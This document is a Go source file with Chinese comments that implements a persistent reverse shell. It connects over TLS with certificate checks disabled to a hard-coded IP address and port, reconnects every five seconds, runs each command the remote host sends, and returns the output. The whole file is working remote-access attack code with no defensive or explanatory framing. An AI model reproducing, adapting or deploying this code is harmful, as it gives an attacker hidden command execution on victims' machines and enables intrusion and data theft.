package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"os/exec"
	"strings"
	"time"
)

func main() {
	// 设置目标服务器 IP 地址和端口
	serverIP := "150.158.142.12"
	serverPort := "8888"

	// 配置 TLS
	config := &tls.Config{
		InsecureSkipVerify: true,
	}

	for {
		// 使用 TLS 连接到 nc 服务
		conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%s", serverIP, serverPort), config)
		if err != nil {
			fmt.Printf("无法连接到 nc 服务: %s\n", err)
			time.Sleep(5 * time.Second)
			continue
		}

		handleConnection(conn)
		fmt.Println("连接已断开，5秒后尝试重新连接")
		time.Sleep(5 * time.Second)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	// 读取来自 nc 服务的命令并执行
	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)
	for {
		cmdString, err := reader.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				fmt.Println("连接已断开")
			} else {
				fmt.Printf("读取命令时出错: %s\n", err)
			}
			break
		}

		// 执行命令
		cmdOutput, err := executeCommand(strings.TrimSpace(cmdString))
		if err != nil {
			fmt.Printf("执行命令时出错: %s\n", err)
			cmdOutput = fmt.Sprintf("Error: %s\n", err)
		} else {
			fmt.Printf("命令输出: %s\n", cmdOutput)
		}

		// 返回执行结果
		writer.WriteString(cmdOutput)
		writer.Flush()
	}
}

func executeCommand(cmdString string) (string, error) {
	cmdParts := strings.Fields(cmdString)
	if len(cmdParts) == 0 {
		return "", fmt.Errorf("空命令")
	}

	cmd := exec.Command(cmdParts[0], cmdParts[1:]...)
	outputBytes, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("执行命令失败: %s", err)
	}

	return string(outputBytes), nil
}
